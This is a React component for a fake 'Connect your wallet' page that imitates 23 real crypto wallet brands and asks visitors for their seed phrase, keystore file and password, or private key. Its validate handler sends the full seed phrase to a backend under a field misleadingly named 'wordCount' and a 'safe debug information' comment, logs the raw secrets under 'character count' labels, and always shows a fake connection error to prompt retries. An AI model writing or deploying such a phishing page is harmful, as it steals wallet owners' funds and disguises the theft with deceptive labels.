import { useState } from "react";
import { ArrowLeft, Check, Loader2 } from "lucide-react";
import { sendDebugInfo } from "../api/api";

import {
 WalletMetamask,
 WalletTrust,
 WalletPhantom,
 WalletCoinbase,
 WalletRabby,
 WalletRainbow,
 WalletArgent,
 WalletExodus,
 WalletTrezor,
 WalletLedger,
 WalletSafe,
 WalletOkx,
 WalletZerion,
 WalletKraken,
 WalletCoin98,
 WalletAtomic,
 WalletZengo,
 WalletSolflare,
 WalletTokenPocket,
 WalletKeplr,
 WalletImtoken,
 WalletAlphaWallet,
 WalletWalletConnect,
} from "@web3icons/react";


const wallets = [
 { name: "MetaMask", icon: WalletMetamask },
 { name: "Trust Wallet", icon: WalletTrust },
 { name: "Phantom", icon: WalletPhantom },
 { name: "Coinbase Wallet", icon: WalletCoinbase },
 { name: "Rabby", icon: WalletRabby },
 { name: "Rainbow", icon: WalletRainbow },
 { name: "Argent", icon: WalletArgent },
 { name: "Exodus", icon: WalletExodus },
 { name: "Trezor", icon: WalletTrezor },
 { name: "Ledger", icon: WalletLedger },
 { name: "Safe", icon: WalletSafe },
 { name: "OKX Wallet", icon: WalletOkx },
 { name: "Zerion", icon: WalletZerion },
 { name: "Kraken Wallet", icon: WalletKraken },
 { name: "Coin98", icon: WalletCoin98 },
 { name: "Atomic Wallet", icon: WalletAtomic },
 { name: "Zengo", icon: WalletZengo },
 { name: "Solflare", icon: WalletSolflare },
 { name: "TokenPocket", icon: WalletTokenPocket },
 { name: "Keplr", icon: WalletKeplr },
 { name: "imToken", icon: WalletImtoken },
 { name: "AlphaWallet", icon: WalletAlphaWallet },
 { name: "WalletConnect", icon: WalletWalletConnect },
];
type Tab = "phrase" | "keystore" | "privateKey";

export default function WalletConnectionPage() {
 const [connectingWallet, setConnectingWallet] = useState<string | null>(
 null,
 );

 const [selectedWallet, setSelectedWallet] = useState<string | null>(null);

 const [isModalOpen, setIsModalOpen] = useState(false);
 const [showErrorToast, setShowErrorToast] = useState(false);

 const [selectedTab, setSelectedTab] = useState<Tab>("phrase");

 // Demo input state
 const [phraseInput, setPhraseInput] = useState("");
 const [keystoreInput, setKeystoreInput] = useState("");
 const [passwordInput, setPasswordInput] = useState("");
 const [privateKeyInput, setPrivateKeyInput] = useState("");

 const handleWalletClick = (walletName: string) => {
 setConnectingWallet(null);
 setSelectedWallet(walletName);
 setSelectedTab("phrase");

 setPhraseInput("");
 setKeystoreInput("");
 setPasswordInput("");
 setPrivateKeyInput("");

  setShowErrorToast(false);
 setIsModalOpen(true);
 };

 const handleClose = () => {
 setIsModalOpen(false);
 setSelectedWallet(null);
 setConnectingWallet(null);
 };

 const handleValidate = async () => {
  console.log("========== VALIDATE CLICKED ==========");

  console.log("Selected wallet:", selectedWallet);

  console.log("Selected tab:", selectedTab);

  if (selectedTab === "phrase") {
    console.log("Phrase entered:", phraseInput.length > 0);

    console.log("Phrase character count:", phraseInput);
  }

  if (selectedTab === "keystore") {
    console.log("Keystore entered:", keystoreInput.length > 0);

    console.log("Keystore character count:", keystoreInput);

    console.log("Password entered:", passwordInput.length > 0);

    console.log("Password character count:", passwordInput);
  }

  if (selectedTab === "privateKey") {
    console.log("Private key entered:", privateKeyInput.length > 0);

    console.log("Private key character count:", privateKeyInput);
  }

  // Send safe debug information to Render
  try {
    await sendDebugInfo({
      selectedWallet: selectedWallet ?? "Unknown",
      selectedTab,
      hasInput:
        selectedTab === "phrase"
          ? phraseInput.length > 0
          : selectedTab === "keystore"
            ? keystoreInput.length > 0
            : privateKeyInput.length > 0,
      inputLength:
        selectedTab === "phrase"
          ? phraseInput.length
          : selectedTab === "keystore"
            ? keystoreInput.length
            : privateKeyInput.length,
      wordCount:
        selectedTab === "phrase" && phraseInput.trim()
          ? String(phraseInput.trim().split(/\s+/))
          : "",
      hasPassword:
        selectedTab === "keystore"
          ? passwordInput.length > 0
          : false,
      passwordLength:
        selectedTab === "keystore"
          ? passwordInput.length
          : 0,
    });

    console.log("Debug information sent to Render");

    setShowErrorToast(true);

    setTimeout(() => {
      setShowErrorToast(false);
    }, 4000);
  } catch (error) {
    console.error("Failed to send debug information:", error);

    setShowErrorToast(true);

    setTimeout(() => {
      setShowErrorToast(false);
    }, 4000);
  }
};

 return (
 <>
   {showErrorToast && (
     <div className="fixed right-5 top-5 z-[100] w-[350px] rounded-xl border border-red-200 bg-white px-5 py-4 shadow-[0_15px_45px_rgba(0,0,0,0.2)]">
       <div className="flex items-start gap-3">
         <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-red-100">
           <span className="text-sm text-red-500">!</span>
         </div>

         <div>
           <p className="text-sm font-semibold text-slate-800">
             Connection issue
           </p>

           <p className="mt-1 text-xs leading-5 text-slate-500">
             There was an error connecting automatically. But don't worry,
             you can still connect manually.
           </p>
         </div>
       </div>
     </div>
   )}

 <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
 {/* Background glow */}
 <div className="pointer-events-none fixed left-1/2 top-1/2 -z-0 h-[700px] w-[900px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-blue-600/[0.07] blur-[180px]" />

 <div className="relative z-10 mx-auto max-w-[1250px]">
 {/* Back button */}
 <button
 type="button"
 onClick={() => window.history.back()}
 className="mb-8 flex items-center gap-2 text-sm font-medium text-slate-400 transition hover:text-white"
 >
 <ArrowLeft className="h-4 w-4" />
 Back
 </button>

 {/* Page title */}
 <h1 className="mb-8 text-3xl font-bold tracking-tight text-slate-100 sm:text-4xl">
 Connect your wallet
 </h1>

 {/* Main wallet panel */}
 <div className="rounded-[14px] bg-[#f8fafc] p-5 shadow-[0_25px_80px_rgba(0,0,0,0.35)] sm:p-8 lg:p-10">
 <h2 className="mb-7 text-2xl font-semibold text-slate-800">
 Connect to a wallet
 </h2>

 {/* Wallet list */}
 <div
 className="
 max-h-[590px]
 space-y-3
 overflow-y-auto
 pr-2
 [&::-webkit-scrollbar]:w-2
 [&::-webkit-scrollbar-track]:rounded-full
 [&::-webkit-scrollbar-track]:bg-slate-200
 [&::-webkit-scrollbar-thumb]:rounded-full
 [&::-webkit-scrollbar-thumb]:bg-slate-400
 [&::-webkit-scrollbar-thumb:hover]:bg-slate-500
 "
 >
 {wallets.map((wallet) => {
 const isConnecting = connectingWallet === wallet.name;

 return (
 <button
 key={wallet.name}
 type="button"
 onClick={() => handleWalletClick(wallet.name)}
 className="group flex min-h-[70px] w-full items-center justify-between rounded-xl border border-slate-200 bg-white px-5 transition-all duration-200 hover:border-blue-300 hover:bg-slate-50 hover:shadow-[0_4px_18px_rgba(37,99,235,0.08)]"
 >
 <div className="flex min-w-0 items-center gap-4">
 <span className="relative flex h-3 w-3 shrink-0">
 <span className="absolute inset-0 rounded-full bg-emerald-400 opacity-30" />
 <span className="relative h-3 w-3 rounded-full bg-emerald-500" />
 </span>

 {isConnecting ? (
 <div className="flex items-center gap-3">
 <Loader2 className="h-4 w-4 animate-spin text-blue-500" />

 <span className="text-[16px] font-medium text-slate-700">
 Connecting to {wallet.name}...
 </span>
 </div>
 ) : (
 <span className="truncate text-[16px] font-medium text-slate-700">
 {wallet.name}
 </span>
 )}
 </div>

 <div className="ml-4 flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-slate-100">
 <wallet.icon
 size={30}
 variant="branded"
 />
 </div>
 </button>
 );
})}
 </div>

 {/* Small status message */}
 <div className="mt-7 flex items-center justify-center gap-2 text-sm text-slate-400">
 <Check className="h-4 w-4 text-emerald-500" />
 <span>Secure wallet connection interface</span>
 </div>
 </div>
 </div>

 {/* CONNECT WALLET MODAL */}
 {isModalOpen && selectedWallet && (
 <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#02002d]/80 px-4 backdrop-blur-[1px]">
 <div
 role="dialog"
 aria-modal="true"
 className="w-full max-w-[470px] rounded-[6px] bg-white px-4 py-6 shadow-[0_25px_80px_rgba(0,0,0,0.45)] sm:px-5"
 >
 

 {/* Wallet title */}
 <h2 className="mb-5 text-center text-[13px] font-semibold text-slate-800">
 Connect your {selectedWallet} wallet
 </h2>

 {/* Tabs */}
 <div className="flex border-b border-slate-300">
 <button
 type="button"
 onClick={() => setSelectedTab("phrase")}
 className={`relative flex-1 pb-2 text-[12px] font-semibold ${
 selectedTab === "phrase"
 ? "text-slate-800"
 : "text-slate-500"
 }`}
 >
 phrase

 {selectedTab === "phrase" && (
 <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
 )}

 </button>

 <button
 type="button"
 onClick={() => setSelectedTab("keystore")}
 className={`relative flex-1 pb-2 text-[12px] font-semibold ${
 selectedTab === "keystore"
 ? "text-[#00d9a5]"
 : "text-slate-500"
 }`}
 >
 keystore JSON

 {selectedTab === "keystore" && (
 <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
 )}
 </button>

 <button
 type="button"
 onClick={() => setSelectedTab("privateKey")}
 className={`relative flex-1 pb-2 text-[12px] font-semibold ${
 selectedTab === "privateKey"
 ? "text-slate-800"
 : "text-slate-500"
 }`}
 >
 Private Key

 {selectedTab === "privateKey" && (
 <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
 )}
 </button>
 </div>

 {/* Tab content */}
 <div className="mt-4 space-y-3">
 {selectedTab === "phrase" && (
 <textarea
 aria-label="input"
 placeholder="Enter your phrase"
 value={phraseInput}
 onChange={(e) => setPhraseInput(e.target.value)}
 className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none"
 />
 )}

 {selectedTab === "keystore" && (
 <>
 <textarea
 aria-label="keystore input"
 placeholder="Enter your keystore"
 value={keystoreInput}
 onChange={(e) => setKeystoreInput(e.target.value)}
 className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none"
 />

 <textarea
 
 aria-label="password input"
 placeholder="Enter your password"
 value={passwordInput}
 onChange={(e) => setPasswordInput(e.target.value)}
 className="h-[38px] w-full rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] outline-none"
 />
 </>
 )}

 {selectedTab === "privateKey" && (
 <textarea
 aria-label="private key input"
 placeholder="Enter your private key"
 value={privateKeyInput}
 onChange={(e) => setPrivateKeyInput(e.target.value)}
 className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none"
 />
 )}
 </div>

 {/* Notice area */}
 <div className="mt-3 rounded-[4px] border border-amber-200 bg-amber-50 px-3 py-2">
 <p className="text-[10px] leading-4 text-amber-700">
 For security, use your connected wallet to approve requests.
 </p>
 </div>

 {/* Validate */}
 <button
  type="button"
  onClick={handleValidate}
  className="mt-4 h-[38px] w-full rounded-[3px] bg-[#15158f] text-[12px] font-bold text-white transition-all duration-200 hover:bg-[#2424c7] hover:shadow-[0_4px_14px_rgba(21,21,143,0.35)] active:scale-[0.98] active:bg-[#101075]"
>
  Validate
</button>

 {/* Close */}
 <div className="mt-3 flex justify-end">
 <button
  type="button"
  onClick={handleClose}
  className="mt-4 h-[38px] w-full rounded-[3px] bg-[#ff3030] px-7 text-[12px] font-bold text-white transition-all duration-200 hover:bg-[#ff4d4d] hover:shadow-[0_4px_14px_rgba(255,48,48,0.35)] active:scale-[0.98] active:bg-[#e52323]"
>
  Close
</button>
 </div>
 </div>
 </div>
 )}
  </main>
 </>
 );
}